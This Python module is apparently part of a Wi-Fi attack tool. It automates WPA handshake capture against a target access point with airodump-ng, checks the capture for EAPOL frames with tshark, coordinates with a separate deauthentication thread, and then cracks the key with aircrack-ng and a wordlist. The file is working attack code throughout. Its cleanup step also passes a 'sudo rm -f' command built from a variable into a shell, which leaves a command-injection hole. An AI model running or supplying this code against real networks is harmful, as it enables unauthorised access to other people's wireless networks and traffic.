# attacks/capture_attack.py

import os
import time
import subprocess

def capture_worker(target_bssid, target_channel, network_interface, timeout_duration, capture_prefix, capture_filepath,
                   wordlist_path, stop_signal):
    """
    Runs airodump-ng, checks for handshake, and attempts crack until stop_signal is set or handshake is cracked.
    """
    print(f"[Capture Thread] Starting capture for BSSID: {target_bssid} on channel {target_channel}")
    airodump_cmd_list = [
        'sudo', 'airodump-ng',
        '--bssid', target_bssid,
        '--channel', target_channel,
        '-w', capture_prefix,
        network_interface
    ]
    WPA_handshake_captured = False

    while not WPA_handshake_captured and not stop_signal.is_set():
        # Clean up old capture files
        cleanup_pattern = f"{capture_prefix}*"
        cleanup_command_str = f"sudo rm -f {cleanup_pattern}"
        try:
            subprocess.run(cleanup_command_str, shell=True, check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        except Exception as e:
            print(f"[Capture Thread] Error during cleanup: {e}")

        # Run airodump-ng for a given timeout
        print(f"[Capture Thread] Running airodump-ng for {timeout_duration} seconds...")
        airodump_process = None
        try:
            airodump_process = subprocess.Popen(airodump_cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            start_time = time.monotonic()
            while time.monotonic() - start_time < timeout_duration:
                if stop_signal.wait(timeout=0.2):
                    print("[Capture Thread] Stop signal received during airodump.")
                    break
            if airodump_process.poll() is None:
                print(f"[Capture Thread] airodump-ng timeout reached ({timeout_duration}s). Checking capture...")
                airodump_process.terminate()
                try:
                    airodump_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    print("[Capture Thread] airodump-ng did not terminate gracefully, killing.")
                    airodump_process.kill()
        except FileNotFoundError:
            print("[Capture Thread] Error: 'airodump-ng' not found. Is aircrack-ng installed?")
            stop_signal.set()
            break
        except Exception as e:
            print(f"[Capture Thread] An unexpected error occurred running airodump-ng: {e}")
            if airodump_process and airodump_process.poll() is None:
                try:
                    airodump_process.terminate()
                    airodump_process.kill()
                except:
                    pass
            stop_signal.set()
            break
        finally:
            if airodump_process and airodump_process.poll() is None:
                try:
                    airodump_process.terminate()
                    airodump_process.kill()
                except:
                    pass

        if stop_signal.is_set():
            break

        # Check for handshake with tshark
        print(f"[Capture Thread] Checking for handshake in: {capture_filepath}")
        if not os.path.exists(capture_filepath):
            print(f"[Capture Thread] Capture file {capture_filepath} not found. Continuing scan...")
            time.sleep(2)
            continue

        try:
            tshark_command = ["tshark", "-r", capture_filepath, "-Y", "eapol"]
            result = subprocess.run(tshark_command, capture_output=True, text=True, check=True, timeout=20)
            output = result.stdout
            if "EAPOL" in output:
                WPA_handshake_captured = True
                print("[Capture Thread] ********** Handshake captured! **********")
                stop_signal.set()  # Signal the deauth thread to stop

                # Attempt handshake crack with aircrack-ng
                print(f"[Capture Thread] Attempting to crack {capture_filepath} with wordlist {wordlist_path}...")
                if not os.path.exists(wordlist_path):
                    print(f"[Capture Thread] Error: Wordlist not found at {wordlist_path}")
                    print("[Capture Thread] Cracking skipped.")
                else:
                    aircrack_command = [
                        'sudo',
                        'aircrack-ng',
                        '-w', wordlist_path,
                        '-b', target_bssid,
                        capture_filepath
                    ]
                    print(f"[Capture Thread] Running command: {' '.join(aircrack_command)}")
                    try:
                        crack_result = subprocess.run(aircrack_command, check=False, text=True)
                        print(f"[Capture Thread] aircrack-ng finished with exit code {crack_result.returncode}.")
                    except FileNotFoundError:
                        print("[Capture Thread] Error: 'aircrack-ng' command not found. Is aircrack-ng installed?")
                    except Exception as e:
                        print(f"[Capture Thread] An error occurred during aircrack-ng execution: {e}")
            else:
                print(f"[Capture Thread] No Handshake Found in {capture_filepath}. Retrying scan...")
                time.sleep(3)
        except subprocess.TimeoutExpired:
            print(f"[Capture Thread] tshark timed out checking {capture_filepath}. Retrying scan...")
            time.sleep(2)
        except subprocess.CalledProcessError as e:
            print(f"[Capture Thread] tshark failed checking {capture_filepath}. Error: {e.stderr}. Retrying scan...")
            time.sleep(3)
        except FileNotFoundError:
            print("[Capture Thread] Error: tshark not found. Please install Wireshark/tshark.")
            stop_signal.set()
            break
        except Exception as e:
            print(f"[Capture Thread] An error occurred during tshark check: {e}. Retrying scan...")
            time.sleep(3)

    print("[Capture Thread] Stopped.")
    if WPA_handshake_captured:
        print(f"[Capture Thread] Handshake capture/crack process complete. Files in: {os.path.dirname(capture_filepath)}")
